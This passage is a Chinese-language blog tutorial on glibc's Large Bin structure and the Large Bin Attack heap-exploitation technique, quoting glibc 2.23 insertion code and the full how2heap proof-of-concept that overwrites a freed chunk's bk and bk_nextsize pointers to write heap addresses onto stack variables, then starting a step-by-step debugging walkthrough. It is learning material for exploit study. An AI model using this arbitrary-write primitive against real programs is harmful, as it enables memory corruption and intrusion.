<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Large Bin Attack | SpaceDraG0n</title><meta name="author" content="SpaceDraG0n"><meta name="copyright" content="SpaceDraG0n"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Large Bin Attack">
<meta property="og:type" content="article">
<meta property="og:title" content="Large Bin Attack">
<meta property="og:url" content="https://spacedragon-ux.github.io/2025/04/24/Large-Bin-Attack/index.html">
<meta property="og:site_name" content="SpaceDraG0n">
<meta property="og:description" content="Large Bin Attack">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://spacedragon-ux.github.io/img/A5.png">
<meta property="article:published_time" content="2025-04-24T15:49:30.584Z">
<meta property="article:modified_time" content="2025-04-26T15:41:27.300Z">
<meta property="article:author" content="SpaceDraG0n">
<meta property="article:tag" content="Large Bin Attack">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://spacedragon-ux.github.io/img/A5.png"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "Large Bin Attack",
  "url": "https://spacedragon-ux.github.io/2025/04/24/Large-Bin-Attack/",
  "image": "https://spacedragon-ux.github.io/img/A5.png",
  "datePublished": "2025-04-24T15:49:30.584Z",
  "dateModified": "2025-04-26T15:41:27.300Z",
  "author": [
    {
      "@type": "Person",
      "name": "SpaceDraG0n",
      "url": "https://spacedragon-ux.github.io/"
    }
  ]
}</script><link rel="shortcut icon" href="/img/%E8%83%8C%E6%99%AF2.png"><link rel="canonical" href="https://spacedragon-ux.github.io/2025/04/24/Large-Bin-Attack/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script async="async" src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script><script>(adsbygoogle = window.adsbygoogle || []).push({
  google_ad_client: '',
  enable_page_level_ads: 'true'
});</script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: '复制成功',
    error: '复制失败',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '天',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: {"chs_to_cht":"已切换为繁体中文","cht_to_chs":"已切换为简体中文","day_to_night":"已切换为深色模式","night_to_day":"已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#2d3035","position":"bottom-left"},
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'Large Bin Attack',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg" style="background-image: url(/img/背景3.png);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/loading.gif" data-original="/img/%E5%A4%B4%E5%83%8F3.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">2</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">2</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">2</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/shuoshuo/"><i class="fa-fw fa fa-comments-o"></i><span> 分享</span></a></li><li><a class="site-page child" href="/photos/"><i class="fa-fw fa fa-camera-retro"></i><span> 相册</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 影视</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/hello-1.png);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/img/loading.gif" data-original="/img/%E5%A4%B4%E5%83%8F.png" alt="Logo"><span class="site-name">SpaceDraG0n</span></a><a class="nav-page-title" href="/"><span class="site-name">Large Bin Attack</span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/shuoshuo/"><i class="fa-fw fa fa-comments-o"></i><span> 分享</span></a></li><li><a class="site-page child" href="/photos/"><i class="fa-fw fa fa-camera-retro"></i><span> 相册</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 影视</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">Large Bin Attack</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-04-24T15:49:30.584Z" title="发表于 2025-04-24 23:49:30">2025-04-24</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-04-26T15:41:27.300Z" title="更新于 2025-04-26 23:41:27">2025-04-26</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%9F%A5%E8%AF%86%E5%BD%92%E7%BA%B3/">知识归纳</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="Large-Bin"><a href="#Large-Bin" class="headerlink" title="Large Bin"></a>Large Bin</h1><ul>
<li><h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念 :"></a>基本概念 :</h2></li>
</ul>
<p>Large Bin 是 glibc 堆内存管理中的一种数据结构，用于存储较大尺寸的空闲内存块，一般管理大于1024字节的空闲chunk（32-bit 系统 512 字节，64-bit 系统 1024 字节）。</p>
<ul>
<li><h2 id="Large-Bin-的结构"><a href="#Large-Bin-的结构" class="headerlink" title="Large Bin 的结构 :"></a>Large Bin 的结构 :</h2></li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  This struct declaration is misleading (but accurate and necessary).</span></span><br><span class="line"><span class="comment">  It declares a &quot;view&quot; into memory allowing access to necessary</span></span><br><span class="line"><span class="comment">  fields at known offsets from a given base. See explanation below.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line">  INTERNAL_SIZE_T      prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">  INTERNAL_SIZE_T      size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>Large Bin 在结构上与其他 Bins 有所不同，在拥有 prev_size 、 size 以及 fd 、 bk 的情况下，<strong>还多了fd_nextsize 和 bk_nextsize 两种指针结构</strong></p>
<ul>
<li>fd_nextsize 表示指向前一个与当前chunk大小不同的第一个空闲块，不包含Bin的头指针。</li>
<li>bk_nextsize 表示指向后一个与当前chunk大小不同的第一个空闲块，不包含Bin的头指针。</li>
</ul>
<p>**组成部分:**Large Bins 中含有 63 个Bins ，而 Large Bins 总体又被分成 6 个组 ， 每个组对应一个区间，且容纳个数呈指数性减少。</p>
<p><img src="/img/loading.gif" data-original="/../PWN/LargeBinAttack/1.png" alt="image-20250425150822345"></p>
<ul>
<li><h2 id="链表结构："><a href="#链表结构：" class="headerlink" title="链表结构："></a>链表结构：</h2><img src="/img/loading.gif" data-original="/../PWN/LargeBinAttack/2.png" alt="image-20250425154611746"></li>
</ul>
<h3 id="补充-："><a href="#补充-：" class="headerlink" title="补充 ："></a>补充 ：</h3><p>只有首堆块的fd_nextsize、bk_nextsize会指向其他大小的内存块，其相同大小的非首堆块的fd_nextsize、bk_nextsize无效 ，通常为0。</p>
<ul>
<li><h2 id="插入顺序："><a href="#插入顺序：" class="headerlink" title="插入顺序："></a>插入顺序：</h2></li>
</ul>
<p><strong>LIBC-2.23源码：</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">if</span> (in_smallbin_range(size)) </span><br><span class="line">&#123;</span><br><span class="line">  victim_index = smallbin_index(size);</span><br><span class="line">  bck = bin_at(av, victim_index);</span><br><span class="line">  fwd = bck-&gt;fd;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">  victim_index = largebin_index(size);</span><br><span class="line">  bck = bin_at(av, victim_index); </span><br><span class="line">  fwd = bck-&gt;fd; </span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fwd != bck) &#123;</span><br><span class="line"></span><br><span class="line">      size |= PREV_INUSE;</span><br><span class="line">      assert((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &lt; (<span class="type">unsigned</span> <span class="type">long</span>) (bck-&gt;bk-&gt;size)) &#123;</span><br><span class="line"></span><br><span class="line">          fwd = bck;</span><br><span class="line">          bck = bck-&gt;bk; </span><br><span class="line"></span><br><span class="line">          victim-&gt;fd_nextsize = fwd-&gt;fd; </span><br><span class="line"></span><br><span class="line">          victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize; </span><br><span class="line"></span><br><span class="line">          fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line"></span><br><span class="line">      &#125; </span><br><span class="line">      <span class="keyword">else</span> </span><br><span class="line">      &#123;</span><br><span class="line">          assert((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">          <span class="keyword">while</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size &lt; fwd-&gt;size) &#123;</span><br><span class="line">              fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">              assert((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size == (<span class="type">unsigned</span> <span class="type">long</span>) fwd-&gt;size)</span><br><span class="line">              fwd = fwd-&gt;fd; </span><br><span class="line">          <span class="keyword">else</span> </span><br><span class="line">          &#123;</span><br><span class="line">              victim-&gt;fd_nextsize = fwd;</span><br><span class="line">              victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">              fwd-&gt;bk_nextsize = victim;</span><br><span class="line">              victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">          &#125;</span><br><span class="line">          bck = fwd-&gt;bk;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125; </span><br><span class="line">  <span class="keyword">else</span> </span><br><span class="line">    victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">mark_bin(av, victim_index);</span><br><span class="line">victim-&gt;bk = bck;</span><br><span class="line">victim-&gt;fd = fwd;</span><br><span class="line">fwd-&gt;bk = victim;</span><br><span class="line">bck-&gt;fd = victim;</span><br></pre></td></tr></table></figure>



<ol>
<li>在 Large Bin 中 ，堆块的排列顺序是从大到小，越大的堆块越靠近头部，越小的堆块越靠近尾部。</li>
<li>大小相同的堆块 ， 按照 free 的先后顺序排序 ，最先释放的堆块作为首堆块，其次释放的堆块延续往后。</li>
</ol>
<h1 id="Large-Bin-Attack"><a href="#Large-Bin-Attack" class="headerlink" title="Large Bin Attack"></a>Large Bin Attack</h1><p>Large Bin Attack 的攻击方式在低版本glibc-2.23和高版本glibc-2.31有所不同，所以我们需要划分为两个板块，分别来描述其攻击手法。</p>
<h2 id="GLIBC-2-23-攻击手法"><a href="#GLIBC-2-23-攻击手法" class="headerlink" title="GLIBC-2.23 攻击手法"></a>GLIBC-2.23 攻击手法</h2><p>为了便于理解，本文将使用<a target="_blank" rel="noopener" href="https://github.com/shellphish/how2heap">how2heap</a>关于Large Bin Attack漏洞利用的源码进行调试分析。</p>
<h4 id="how2heap源码展示："><a href="#how2heap源码展示：" class="headerlink" title="how2heap源码展示："></a>how2heap源码展示：</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This file demonstrates large bin attack by writing a large unsigned long value into stack\n&quot;</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;In practice, large bin attack is generally prepared for further attacks, such as rewriting the &quot;</span></span><br><span class="line">           <span class="string">&quot;global variable global_max_fast in libc for further fastbin attack\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> stack_var1 = <span class="number">0</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> stack_var2 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Let&#x27;s first look at the targets we want to rewrite on stack:\n&quot;</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_var1 (%p): %ld\n&quot;</span>, &amp;stack_var1, stack_var1);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_var2 (%p): %ld\n\n&quot;</span>, &amp;stack_var2, stack_var2);</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0x420</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now, we allocate the first large chunk on the heap at: %p\n&quot;</span>, p1 - <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;And allocate another fastbin chunk in order to avoid consolidating the next large chunk with&quot;</span></span><br><span class="line">           <span class="string">&quot; the first large chunk during the free()\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x500</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Then, we allocate the second large chunk on the heap at: %p\n&quot;</span>, p2 - <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;And allocate another fastbin chunk in order to avoid consolidating the next large chunk with&quot;</span></span><br><span class="line">           <span class="string">&quot; the second large chunk during the free()\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *p3 = <span class="built_in">malloc</span>(<span class="number">0x500</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Finally, we allocate the third large chunk on the heap at: %p\n&quot;</span>, p3 - <span class="number">2</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;And allocate another fastbin chunk in order to avoid consolidating the top chunk with&quot;</span></span><br><span class="line">           <span class="string">&quot; the third large chunk during the free()\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">free</span>(p1);</span><br><span class="line">    <span class="built_in">free</span>(p2);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;We free the first and second large chunks now and they will be inserted in the unsorted bin:&quot;</span></span><br><span class="line">           <span class="string">&quot; [ %p &lt;--&gt; %p ]\n\n&quot;</span>, (<span class="type">void</span> *)(p2 - <span class="number">2</span>), (<span class="type">void</span> *)(p2[<span class="number">0</span>]));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now, we allocate a chunk with a size smaller than the freed first large chunk. This will move the&quot;</span></span><br><span class="line">            <span class="string">&quot; freed second large chunk into the large bin freelist, use parts of the freed first large chunk for allocation&quot;</span></span><br><span class="line">            <span class="string">&quot;, and reinsert the remaining of the freed first large chunk into the unsorted bin:&quot;</span></span><br><span class="line">            <span class="string">&quot; [ %p ]\n\n&quot;</span>, (<span class="type">void</span> *)((<span class="type">char</span> *)p1 + <span class="number">0x90</span>));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(p3);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now, we free the third large chunk and it will be inserted in the unsorted bin:&quot;</span></span><br><span class="line">           <span class="string">&quot; [ %p &lt;--&gt; %p ]\n\n&quot;</span>, (<span class="type">void</span> *)(p3 - <span class="number">2</span>), (<span class="type">void</span> *)(p3[<span class="number">0</span>]));</span><br><span class="line"> </span><br><span class="line">    <span class="comment">//------------VULNERABILITY-----------</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now emulating a vulnerability that can overwrite the freed second large chunk&#x27;s \&quot;size\&quot;&quot;</span></span><br><span class="line">            <span class="string">&quot; as well as its \&quot;bk\&quot; and \&quot;bk_nextsize\&quot; pointers\n&quot;</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Basically, we decrease the size of the freed second large chunk to force malloc to insert the freed third large chunk&quot;</span></span><br><span class="line">            <span class="string">&quot; at the head of the large bin freelist. To overwrite the stack variables, we set \&quot;bk\&quot; to 16 bytes before stack_var1 and&quot;</span></span><br><span class="line">            <span class="string">&quot; \&quot;bk_nextsize\&quot; to 32 bytes before stack_var2\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    p2[<span class="number">-1</span>] = <span class="number">0x3f1</span>;</span><br><span class="line">    p2[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    p2[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">    p2[<span class="number">1</span>] = (<span class="type">unsigned</span> <span class="type">long</span>)(&amp;stack_var1 - <span class="number">2</span>);</span><br><span class="line">    p2[<span class="number">3</span>] = (<span class="type">unsigned</span> <span class="type">long</span>)(&amp;stack_var2 - <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//------------------------------------</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Let&#x27;s malloc again, so the freed third large chunk being inserted into the large bin freelist.&quot;</span></span><br><span class="line">            <span class="string">&quot; During this time, targets should have already been rewritten:\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_var1 (%p): %p\n&quot;</span>, &amp;stack_var1, (<span class="type">void</span> *)stack_var1);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_var2 (%p): %p\n&quot;</span>, &amp;stack_var2, (<span class="type">void</span> *)stack_var2);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// sanity check</span></span><br><span class="line">    assert(stack_var1 != <span class="number">0</span>);</span><br><span class="line">    assert(stack_var2 != <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Large-Bin-Attack-的利用思路以及其作用："><a href="#Large-Bin-Attack-的利用思路以及其作用：" class="headerlink" title="Large Bin Attack 的利用思路以及其作用："></a>Large Bin Attack 的利用思路以及其作用：</h3><p>再进行下一步的调试之前，我们需要先知道 Large Bin Attack 的利用思路和作用，才能帮助我们更好的理解 Large Bin Attack 手法：</p>
<ul>
<li>利用思路：通过纂改已释放的大堆块的 bk_nextsize 指针 ， 在 largebin 的插入过程中，利用大堆块的排序机制 ，实现 Large Bin Attack。</li>
<li>作用：可以实现任意地址写入堆块地址。</li>
</ul>
<h3 id="Large-Bin-Attack-源码调试："><a href="#Large-Bin-Attack-源码调试：" class="headerlink" title="Large Bin Attack 源码调试："></a>Large Bin Attack 源码调试：</h3><p>（为了更加便于理解，我会把调试过程拆解成几个大板块，同时分支细化成数个小板块）</p>
<p><u>第一步：目标地址以及大堆块的创建</u></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">long</span> stack_var1 = <span class="number">0</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> stack_var2 = <span class="number">0</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0x420</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x500</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> *p3 = <span class="built_in">malloc</span>(<span class="number">0x500</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br></pre></td></tr></table></figure>

<p><img src="/img/loading.gif" data-original="/../PWN/LargeBinAttack/3.png" alt="image-20250426195629165"></p>
<p>创建了两个变量 stack_var1 和 stack_var2 ，以及三个大堆块 p1、p2 和 p3，大小分别是0x430、0x510、0x510 ，其中每个大堆块以及 Top chunk 中间都隔了一个0x30小堆块，这个小堆块的作用是防止大堆块之间相互合并。</p>
<p><strong>我们的目标就是将 stack_var1 和 stack_var2 的值改写成堆块的地址，可以看到现在两个变量的值都是零 。</strong></p>
<p><u>第二步：释放 p1 和 p2 ，使其进入 unsorted bin。</u></p>
